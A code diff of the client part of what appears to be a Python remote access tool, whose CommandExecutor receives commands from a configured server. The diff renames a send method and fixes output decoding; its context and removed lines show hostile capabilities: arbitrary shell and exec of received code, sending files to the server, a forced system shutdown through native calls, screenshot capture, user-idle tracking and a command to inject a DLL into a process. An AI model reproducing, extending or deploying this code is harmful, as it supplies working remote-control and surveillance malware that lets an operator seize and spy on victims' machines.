@@ -9,6 +9,8 @@ import socket
 import subprocess
 import threading
 import time
+import sys
+import locale
 
 from client.config.config import SERVER_ADDR
 from client.util.decorator import desc, params, enclosing, require_admin, require_integrity
@@ -23,6 +25,8 @@ if os.name == 'nt':
     LP_APPLICATION_NAME, LP_COMMAND_LINE = get_executable_info()
 
 UP_TIME = get_time()
+
+
 
 
 # noinspection PyMethodMayBeStatic
@@ -82,7 +86,7 @@ class CommandExecutor:
             self.send_to_server(1, line.decode(locale.getdefaultlocale()[1]).strip('\n'), 0)
 
     def send_to_server(self, status, result, end):
-        self.socket.send_result(self.command_id, status, result, end)
+        self.socket.send_response(self.command_id, status, result, end)
 
     def get_command_list(self):
         methods = [name for name, method in inspect.getmembers(self, inspect.ismethod) if hasattr(method, 'help')]
@@ -119,8 +123,10 @@ class CommandExecutor:
     def shell(self, command):
         cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.DEVNULL)
-        stdout = str(cmd.stdout.read(), locale.getdefaultlocale()[1])
-        stderr = str(cmd.stderr.read(), locale.getdefaultlocale()[1])
+        # stdout = str(cmd.stdout.read(), locale.getdefaultlocale()[1])
+        # stderr = str(cmd.stderr.read(), locale.getdefaultlocale()[1])
+        stdout = str(cmd.stdout.read(), locale.getpreferredencoding() or 'utf-8')
+        stderr = str(cmd.stderr.read(), locale.getpreferredencoding() or 'utf-8')
         if stdout:
             return 1, stdout
         elif stderr:
@@ -153,8 +159,8 @@ class CommandExecutor:
     @desc('download file')
     def download(self, filename):
         if os.path.isfile(filename):
-            self.socket.send_result(self.command_id, 1, 'Preparing to send file', eof=0)
-            self.socket.send_result(self.command_id, 1, 'File length is {}'.format(os.path.getsize(filename)), eof=0)
+            self.socket.send_response(self.command_id, 1, 'Preparing to send file', eof=0)
+            self.socket.send_response(self.command_id, 1, 'File length is {}'.format(os.path.getsize(filename)), eof=0)
             self.socket.send_file(self.command_id, filename)
         else:
             return 0, 'File does not exist'
@@ -205,17 +211,7 @@ class CommandExecutor:
             exec(code, kwargs)
         return 1, f.getvalue()
 
-    @desc('grab a screenshot')
-    def screenshot(self):
-        self.send_to_server(1, 'Importing module: pyautogui', 0)
-        import pyautogui
-        self.send_to_server(1, 'Preparing to take a screenshot', 0)
-        filename = 'screenshot_{}.png'.format(get_time())
-        pyautogui.screenshot(filename)
-        self.send_to_server(1, 'Screenshot success', 0)
-        self.send_to_server(1, f'Preparing to send file, length is {get_size(os.path.getsize(filename))}', 0)
-        self.socket.send_file(self.command_id, filename)
-        os.remove(filename)
+
 
     @desc('load module and execute in new thread')
     def load(self, arg):
@@ -308,40 +304,10 @@ class CommandExecutor:
         finally:
             return 1, format_dict(info)
 
-    @desc('detect user inactive time')
-    def idletime(self):
-        import win32api
-        return 1, 'User has been idle for: {} seconds'.format(
-            (win32api.GetTickCount() - win32api.GetLastInputInfo()) / 1000.0)
 
-    @desc('perform emergency shutdown')
-    def poweroff(self):
-        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
-        ctypes.windll.ntdll.ZwShutdownSystem(2)
 
-    @desc('create a zip archive')
-    def zip(self, dir_name):
-        import pathlib
-        import shutil
-        import tempfile
-        tempdir = tempfile.mkdtemp()
-        dir_name = os.path.abspath(dir_name)
-        if not os.path.isdir(dir_name):
-            return 0, f'Directory does not exist: {dir_name}'
-        zip_name = os.path.basename(dir_name)
-        pardir = pathlib.Path(dir_name).resolve().parent
-        filename = shutil.make_archive(os.path.join(tempdir, zip_name), format='zip', root_dir=pardir,
-                                       base_dir=os.path.basename(dir_name))
-        return 1, f'Archive created: {filename}'
 
-    @desc('extract files from a zip archive')
-    def unzip(self, zip_name):
-        import shutil
-        zip_name = os.path.abspath(zip_name)
-        if not os.path.isfile(zip_name):
-            return 0, f'File does not exist: {zip_name}'
-        shutil.unpack_archive(zip_name, os.getcwd())
-        return 1, f'Archive extracted to {os.getcwd()}'
+
 
     @desc('inject DLL into process')
     @params('pid', 'dll_path')
